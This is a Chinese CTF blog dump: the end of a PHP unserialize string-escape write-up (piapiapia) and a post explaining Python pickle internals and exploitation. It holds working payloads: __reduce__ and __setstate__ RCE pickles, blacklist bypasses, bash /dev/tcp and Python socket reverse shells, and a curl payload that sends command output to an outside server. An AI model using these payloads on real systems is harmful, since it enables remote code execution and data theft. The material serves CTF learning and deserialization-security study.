array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); 整个流程大概就是先注册(register.php)，填入username@password，对这两个字段过滤(class.php)，把.和\\替换成_,把'select', 'insert', 'update', 'delete', 'where'替换成hacker，password被md5加密，然后进入登录页面(login.php)，输入刚才的名字密码，发现第一次登录profile字段没有值，也就是没有认证，会跳转到update.php的界面，在这个页面对profile赋值: 12345$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);$user-&gt;update_profile($username, serialize($profile)); &lt;-- 进行了序列化操作 赋值后会进行一次有替换操作的过滤然后插入到数据库，然后回到profile.php,通过认证后: 12345$profile = unserialize($profile); --&gt; 进行了反序列化$phone = $profile[&#x27;phone&#x27;];$email = $profile[&#x27;email&#x27;];$nickname = $profile[&#x27;nickname&#x27;];$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); 可以发现一个很关键的地方，插入的时候进行了序列化，序列化后进行了过滤，过滤中又有字符串的替换，然后将替换后的字符串在进行反序列化，这其中字符串的替换如果替换长度有问题，就可能导致超出序列化时确定的字符长度的字符不会被反序列化。 看看class.php中关键的过滤函数: 12345678public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string);&#125; 发现被替换的单词where和他的替换者hacker长度不一样，所以存在这种反序列化操作的逻辑漏洞 我们目的是在nickname后面填充上&quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;，但是由于对email和nickname长度都进行了限制，所以无法构造完整的payload，所以要绕过这个长度限制，可以用数组来绕过 1234没法构造完整的payloada:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:5:&quot;1@1.a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;a&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;;&#125;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:32:&quot;wherewhere@wherewhere.wheres:13:&quot;;s:8:&quot;nickname&quot;;s:10:&quot;config.php&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;;&#125;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:32:&quot;hackerhacker@hackerhacker.hackers:13:&quot;;s:8:&quot;nickname&quot;;s:10:&quot;config.php&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/9e5e2527d69c009a81b8ecd730f3957e&quot;;&#125; 1234567md5(Array()) = nullsha1(Array()) = null ereg(pattern,Array()) = nullpreg_match(pattern,Array()) = falsestrcmp(Array(), &quot;abc&quot;) = nullstrpos(Array(),&quot;abc&quot;) = nullstrlen(Array()) = null &quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;是34个字符，hacker比where长度大1，所以需要34个where被替换成hacker payload: 1nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 12345678序列化后的亚子:$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;序列化后的关键部分:s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/7c58dc746fb4034df0e2f6f4467198ab&quot;;&#125;序列化并进行替换后的亚子,可以发现s:204刚好覆盖了hacker的长度:s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/7c58dc746fb4034df0e2f6f4467198ab&quot;;&#125; 最后提取base64解密就好了 本地测试的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?php function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $profile=serialize($profile); $profile=filter($profile); $profile=unserialize($profile); $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); echo &#x27;Update Profile Success&#x27;; echo &#x27;&lt;img src=&quot;data:image/gif;base64,&#x27;.$photo.&#x27;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;serilize.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt;"},{"title":"python-Pickle序列化","date":"2020-03-07","updated":"2024-03-19","path":"2020/03/07/python-Pickle序列化/","text":"Pickle构造原理 0x00 Pickle是干什么用的：序列化、反序列化 在很多任务中，我们可能会需要把一些内容存储起来，以备后续利用。如果我们要存储的内容只是一条字符串或是数字，那么我们只需要把它写进文件就行。然而，如果我们需要存储的东西是一个dict、一个list，甚至一个对象： 123456class dairy(): date = 20191029 text = &quot;今天哈尔滨冷死人了QAQ&quot; todo = [&#x27;大物实验报告&#x27;, &#x27;CTF题&#x27;, &#x27;CSAPP作业&#x27;]today = dairy() 要把这样的dairy实例today存放在文件里，日后还要支持随时导入，就是很麻烦的事情了。通行的做法是：通过一套方案，把这个today 翻译成一个字符串，然后把字符串写进文件；读取的时候，通过读文件拿到字符串，然后翻译成dairy类的一个实例。 我们把“对象 -&gt; 字符串”的翻译过程称为“序列化”；相应地，把“字符串 -&gt; 对象”的过程称为“反序列化” 。需要保存一个对象的时候，就把它序列化变成字符串；需要从字符串中提取一个对象的时候，就把它反序列化。各大语言都有序列化库，而很多时候，不恰当的反序列化会成为攻击的目标。在后文我们将深入探讨其利用方式。 Python提供的序列化库是pickle. 下面，我们举一个例子来说明其工作方式： 序列化与反序列化 在这里，我们定义了一个很复杂的对象交给x，然后执行pickle.dumps(x)，来把x翻译成字符串。**这个字符串又臭又长，不过我们在接下来的章节中会详细讲如何阅读它。**接下来，把这个字符串翻译成对象交给r，可以发现r已经是我们最开始打包的那个复杂对象。 存储字符串比存储对象方便得多——这就是pickle的意义所在。工作过程如下图： 把对象序列化成字符串，然后就可以方便地存储、传输了 这就是pickle最基础的使用方法。pickle不仅可以读写字符串，也可以读写文件：只需要采用pickle.dump()和pickle.load(). 另外有一点需要注意：对于我们自己定义的class，如果直接以形如date = 20191029的方式赋初值，**则这个date不会被打包！**解决方案是写一个__init__方法， 也就是这样： 注意自己定义的class，一定要把初值写进__init__ 0x01 pickle.loads机制：调用_Unpickler类 pickle.loads是一个供我们调用的接口。其底层实现是基于_Unpickler类。代码实现如下： load和loads接口 可以看出，_load和_loads基本一致，都是把各自输入得到的东西作为文件流，喂给_Unpickler类；然后调用_Unpickler.load()实现反序列化。 所以，接下来的任务就很清楚了：读一遍_Unpickler类的源码，然后弄清楚它干了什么事。 0x02 _Unpickler类：莫得感情的反序列化机器 在反序列化过程中，_Unpickler（以下称为机器吧）维护了两个东西：栈区和存储区。结构如下（本图片仅为示意图）： 机器维护的两个结构 栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。 存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。 您可以想象，一台机器读取我们输入的字符串，然后操作自己内部维护的各种结构，最后吐出来一个结果——这就是我们莫得感情的_Unpickler。为了研究它，也为了看懂那些乱七八糟的字符串，我们需要一个有力的调试器。这就是pickletools。 0x03 pickletools：良心调试器 pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种。来看看效果吧： 原始字符串的反汇编结果 这就是反汇编功能：解析那个字符串，然后告诉你这个字符串干了些什么。**每一行都是一条指令。**接下来试一试优化功能： 优化后的结果 可以看到，字符串s比以前短了很多，而且反汇编结果中，BINPUT指令没有了。所谓“优化”，其实就是把不必要的PUT指令给删除掉。这个PUT意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些PUT指令。 利用pickletools，我们能很方便地看清楚每条语句的作用、检验我们手动构造出的字符串是否合法……总之，是我们调试的利器。现在手上有了工具，我们开始研究这个字符串是如何被pickle解读的吧。 以下内容建议对照pickle的源码来阅读。您可以这样找到pickle源码的位置： 0x04 反序列化机器：语法严格、向前兼容 pickle构造出的字符串，有很多个版本。在pickle.loads时，可以用Protocol参数指定协议版本，例如指定为0号版本： 依据0号协议所编码的字符串 目前这些协议有0,2,3,4号版本，默认为3号版本。这所有版本中，0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。 刚刚说过，字符串中包含了很多条指令。这些指令一定以一个字节的指令码（opcode）开头；接下来读取多少内容，由指令码来决定（严格规定了读取几个参数、参数的结束标志符等）。指令编码是紧凑的，一条指令结束之后立刻就是下一条指令。 一起来分析一个小例子： 第一行是字符串，接下来是这个字符串的反汇编结果 字符串的第一个字节是\\x80（这个操作符于版本2被加入）。机器看到这个操作符，立刻再去字符串读取一个字节，得到x03。解释为“这是一个依据3号协议序列化的字符串”，这个操作结束。 机器取出下一个字符作为操作符——c。这个操作符（称为GLOBAL操作符）对我们以后的工作非常有用——它连续读取两个字符串module和name，规定以\\n为分割；接下来把module.name这个东西压进栈。那么现在读取到的两个字符串分别是__main__和Student，于是把__main__.Student扔进栈里。 注：GLOBAL操作符读取全局变量，是使用的find_class函数。而find_class对于不同的协议版本实现也不一样。总之，它干的事情是“去x模块找到y”，y必须在x的顶层（也即，y不能在嵌套的内层）。 程序的车轮继续滚滚向前。它遇到了)这个操作符。它的作用是“把一个空的tuple压入当前栈”。处理完这个操作符之后 接下来程序读取到了x81操作符。它的作用是：从栈中先弹出一个元素，记为args；再弹出一个元素，记为cls。接下来，执行cls.__new__(cls, *args) ，然后把得到的东西压进栈。说人话，那就是：从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压进栈。 容易看出，上面的操作全都执行完了之后，栈里面还剩下一个元素——它是被实例化了的Student对象，目前这里面什么也没有，因为当初实例化它的时候，args是个空的数组。 让我们继续分析。程序现在读入了一个&#125;，它的意思是“把一个空的dict压进栈”。 然后是MARK操作符(，这个操作符干的事情称为load_mark： 把当前栈这个整体，作为一个list，压进前序栈。 把当前栈清空。 现在您知道为什么栈区要分成当前栈和前序栈两部分了吗？前序栈保存了程序运行至今的（不在顶层的）完整的栈信息，而当前栈专注于处理顶层的事件。 讲到这里，我们不得不介绍另一个操作——pop_mark。它没有操作符，只供其他的操作符来调用。干的事情自然是load_mark的反向操作： 记录一下当前栈的信息，作为一个list，在load_mark结束时返回。 弹出前序栈的栈顶，用这个list来覆盖当前栈。 load_mark相当于进入一个子过程，而pop_mark相当于从子过程退出，把栈恢复成调用子过程之前的情况。所有与栈的切换相关的事情，都靠调用这两个方法来完成。因此load_mark和pop_mark是栈管理的核心方法。 回到我们这个程序，继续看MARK之后的内容： 下一个操作符是V。它的意义是：读入一个字符串，以\\n结尾；然后把这个字符串压进栈中。我们看到这里有四个V操作，它们全都执行完的时候，当前栈里面的元素是：（由底到顶）name, rxz, grade, G2。前序栈只有一个元素，是一个list，这个list里面有两个元素：一个空的Student实例，以及一个空的dict。 现在我们看到了u操作符。它干这样的事情： 调用pop_mark。也就是说，把当前栈的内容扔进一个数组arr，然后把当前栈恢复到MARK时的状态。 执行完成之后，arr=['name', 'rxz', 'grade', 'G2']；当前栈里面存的是__main__.Student这个类、一个空的dict 拿到当前栈的末尾元素，规定必须是一个dict。 这里，读到了栈顶那个空dict。 两个一组地读arr里面的元素，前者作为key，后者作为value，存进上一条所述的dict。 模拟一下这个过程，发现原先是空的那个dict现在变成了&#123;'name': 'rxz', 'grade': 'G2'&#125;这样一个dict。所以现在，当前栈里面的元素是：__main__.Student的一个空的实例，以及&#123;'name': 'rxz', 'grade': 'G2'&#125;这个dict。 下一个指令码是b，也就是BUILD指令。它干的事情是： 把当前栈栈顶存进state，然后弹掉。 把当前栈栈顶记为inst，然后弹掉。 利用state这一系列的值来更新实例inst。把得到的对象扔进当前栈。 注：这里更新实例的方式是：如果inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则的话，直接把state这个dist的内容，合并到inst.__dict__ 里面。 事实上，这里产生了一个安全漏洞。您可以想一想该如何利用。 上面的事情干完之后，当前栈里面只剩下了一个实例——它的类型是__main__.Student，里面name值是rxz，grade值是G2。下一个指令是.（一个句点，STOP指令），pickle的字符串以它结尾，意思是：“当前栈顶元素就是反序列化的最终结果，把它弹出，收工！” 注：使用pickletools.dis分析一个字符串时，如果.执行完毕之后栈里面还有东西，会抛出一个错误；而pickle.loads没有这么严格的检查——它会正常结束。 当所有的事情干完之后，我们得到了什么呢？如下图所示： 反序列化大成功 至此我们完成了一个简单例子的分析。刚刚我们通过手动模拟这台机器的运行过程，理解了pickle反序列化的原理——如何处理指令、如何管理栈等等。这已经足够我们把握pickle的思想，剩余的就是细枝末节的东西了。 但是，细枝末节的东西，往往暗藏着漏洞 :） Bypass http://blog.nsfocus.net/绕过-restrictedunpickler/ Python反序列化漏洞的花式利用 0x01 __reduce__：（曾经的）万恶之源 在写下本文之前，CTF竞赛对pickle的利用多数是在__reduce__方法上。它的指令码是R，干了这么一件事情： 取当前栈的栈顶记为args，然后把它弹掉。 取当前栈的栈顶记为f，然后把它弹掉。 以args为参数，执行函数f，把结果压进当前栈。 class的__reduce__方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了R指令码。 f要么返回字符串，要么返回一个tuple，后者对我们而言更有用。 一种很流行的攻击思路是：利用 __reduce__ 构造恶意字符串，当这个字符串被反序列化的时候，__reduce__会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个Student对象。我们想构造一个字符串，它在反序列化的时候，执行ls /指令。那么我们只需要这样得到payload： optimize加不加无所谓，这里为了我们查看汇编结果方便，就加上了优化 现在把payload拿给正常的程序（Student类里面没有__reduce__方法）去解析： 即使Student类是正常的，pickle.loads仍然执行了os.system('ls /') 一个样例如下： 123456789101112#!/usr/bin/env python# encoding: utf-8import osimport pickleclass test(object): def __reduce__(self): return (os.system,(&#x27;ls&#x27;,))a=test()payload=pickle.dumps(a)print payloadpickle.loads(payload) 其中pickle.loads是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。 之前把python的标准库都大概过了一遍，把其中绝大多数的可用函数罗列如下： 123456789101112131415161718192021eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen 除开我们常见的那些os库、subprocess库、commands库之外还有很多可以执行命令的函数，这里用举两个不常用的: 12345map(__import__(&#x27;os&#x27;).system,[&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;,])sys.call_tracing(__import__(&#x27;os&#x27;).system,(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;,))platform.popen(&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#x27;&quot;) 那么，如何过滤掉reduce呢？由于__reduce__方法对应的操作码是R，只需要把操作码R过滤掉就行了。这个可以很方便地利用pickletools.genops来实现。 如果reduce这一套手段被过滤，我们应该如何利用呢？以下就是本篇文章的正题。 0x02 绕过函数黑名单：奇技淫巧 有一种过滤方式：不禁止R指令码，但是对R执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单： 1black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen] 可惜platform.popen()不在名单里，它可以做到类似system的功能。这题死于黑名单有漏网之鱼。 另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事： 123class Exploit(object): def __reduce__(self): return map,(os.system,[&quot;ls&quot;]) 总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉R这个指令码。 0x03 全局变量包含：c指令码的妙用 有这么一道题，彻底过滤了R指令码（写法是：只要见到payload里面有R这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，反序列化之后，name和grade需要与blue这个module里面的name、grade相对应。 目标是取得well done 不能用R指令码了，不过没关系。还记得我们的c指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果： 如何用c指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的rxz改成从blue引入的name，写成指令就是：cblue\\nname\\n。把用于编码rxz的X\\x03\\x00\\x00\\x00rxz替换成我们的这个global指令，来看看改造之后的效果： load一下，发现真的引入了blue里面的变量 把这个payload进行base64编码之后传进题目，得到well done。 顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。 0x04 绕过c指令module限制：先读入，再篡改 之前提到过，c指令（也就是GLOBAL指令）基于find_class这个方法， 然而find_class可以被出题人重写。如果出题人只允许c指令包含__main__这一个module，这道题又该如何解决呢？ 通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！ 有了这个知识作为前提，我们可以干这么一件事： 通过__main__.blue引入这一个module，由于命名空间还在main内，故不会被拦截 把一个dict压进栈，内容是&#123;'name': 'rua', 'grade': 'www'&#125; 执行BUILD指令，会导致改写 __main__.blue.name和 __main__.blue.grade ，至此blue.name和blue.grade已经被篡改成我们想要的内容 弹掉栈顶，现在栈变成空的 照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’ 由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉。 1payload = b&#x27;\\x80\\x03c__main__\\nblue\\n&#125;(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.&#x27; 绿框区域完成了篡改 题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue. 0x05 不用reduce，也能RCE 之前谈到过，__reduce__与R指令是绑定的，禁止了R指令就禁止了__reduce__ 方法。那么，在禁止R指令的情况下，我们还能RCE吗？这就是本文研究的重点。 现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用fun(arg)，其中fun和arg都必须可控。 审pickle源码，来看看BUILD指令（指令码为b）是如何工作的： BUILD指令实现 这里的实现方式也就是上文的注所提到的：如果inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则的话，直接把state这个dist的内容，合并到inst.__dict__ 里面。 它有什么安全隐患呢？我们来想想看：Student原先是没有__setstate__这个方法的。那么我们利用&#123;'__setstate__': os.system&#125;来BUILE这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用&quot;ls /&quot;来再次BUILD这个对象，则会执行setstate(&quot;ls /&quot;) ，而此时__setstate__已经被我们设置为os.system，因此实现了RCE. payload构造如下： 1payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.&#x27; 执行结果： 成功RCE！接下来可以通过反弹shell来控制靶机了。 有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下： 1payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.&#x27; 绿色框内为恶意代码 没有抛出异常。 至此，我们完成了不使用R指令、无副作用的RCE。Congratulations！ 0x06 一些细节 一、**其他模块的load也可以触发pickle反序列化漏洞。**例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。 二、即使代码中没有import os，GLOBAL指令也可以自动导入os.system。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。 三、**即使没有回显，也可以很方便地调试恶意代码。**只需要拥有一台公网服务器，执行os.system('curl your_server/ls / | base64)，然后查询您自己的服务器日志，就能看到结果。这是因为：以```引号包含的代码，在sh中会直接执行，返回其结果。 下面给出一个例子： 1payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVcurl 47.***.***.105/`ls / | base64`\\nb.&#x27; payload pickle.loads()效果 pickle.loads()时，ls /的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过curl把执行结果送到我们的服务器上。 上文发出去的请求缺了一段，是因为url没有加引号。 0x07 input函数 相信有童鞋已经敏锐的注意到了这个input函数，这个通常很难进入大家的视线。 这个函数也仅在python2中能够利用，在之前的博客python深入学习(三)：从py2到py3 中提到过为什么。 这个函数在python2中是能够执行python代码的。但是有一个问题就是这个函数是从标准输入获取字符串，所以怎么利用就是一个问题，不过相信大家看到我 hook pickle的load的方法就知道这里该怎么利用了，我们可以利用StringIO库，然后将标准输入修改为StringIO创建的内存缓冲区即可。 接下来，我们以在hitb 2018中的python revenge为例来说明怎么把这个函数用起来。 首先关于pickle 的数据流协议在python2里面有三种，python3里面有五种，默认的是0，具体可以看看勾陈安全实验室的Python Pickle的任意代码执行漏洞实践和Payload构造,其中对协议进行说明，这里搬运下： 